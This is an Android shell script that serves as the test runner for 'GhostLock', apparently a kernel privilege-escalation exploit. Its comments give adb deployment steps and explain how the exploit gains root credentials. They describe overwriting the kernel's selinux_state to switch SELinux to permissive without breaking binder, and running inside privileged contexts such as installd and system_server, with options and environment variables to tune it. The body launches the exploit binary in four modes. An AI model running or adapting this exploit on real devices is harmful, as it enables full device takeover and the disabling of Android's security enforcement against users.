#!/system/bin/sh
#
# GhostLock - coffey test runner (device-side)
#
#   adb push ghostlock /data/local/tmp/ghostlock
#   adb push test_both.sh /data/local/tmp/test_both.sh
#   adb shell chmod 755 /data/local/tmp/ghostlock /data/local/tmp/test_both.sh
#   adb shell -t
#
#   sh /data/local/tmp/test_both.sh b        # default: permissive, binder alive
#   sh /data/local/tmp/test_both.sh b-zero   # legacy zero write (breaks binder)
#   sh /data/local/tmp/test_both.sh a        # run in u:r:installd:s0
#   sh /data/local/tmp/test_both.sh a-sys    # run in u:r:system_server:s0
#
# Defaults (no options needed):
#   ./ghostlock --cred
#     - writes a page-aligned address of the reclaim page to selinux_state:
#         byte0 = 0   -> enforcing = 0
#         byte2 odd   -> initialized stays TRUE (security_sid_to_context_core
#                        tests bit 0, verified in the kernel image)
#       so SELinux is permissive AND binder/security_secid_to_secctx works
#       -> `pm` keeps working.
#     - the parity guard skips an even-byte2 page and retries
#       (CRED_ATTEMPTS default 6).
#
# Options:
#   --permissive     keep initialized=1            (default)
#   --zero-selinux   legacy 8-byte zero write      (initialized=0, binder breaks)
#   --cred-only      mode 6, SELinux stays enforcing
#   --attempts N     reclaim attempts 1..6         (default 6)
#   --domain CTX     run in a domain (implies --cred-only)
#   --help
#
# Every knob is also an env var, e.g.
#   GHOST_ENFORCE_INIT=0 ./ghostlock --cred
#   GHOST_SID_ANY=1 GHOST_SID_SCAN_CTX=u:r:installd:s0 GHOST_SID_KEEP=1 \
#     GHOST_SELINUX=0 ./ghostlock --cred

cd /data/local/tmp || exit 1
rm -f /data/local/tmp/.ghostlock_out /data/local/tmp/gl2_test_create.txt 2>/dev/null

case "$1" in
  a)      ./ghostlock --cred --domain u:r:installd:s0 ;;
  a-sys)  ./ghostlock --cred --domain u:r:system_server:s0 ;;
  b)      ./ghostlock --cred ;;
  b-zero) ./ghostlock --cred --zero-selinux ;;
  *)      echo "usage: $0 a|a-sys|b|b-zero" ;;
esac
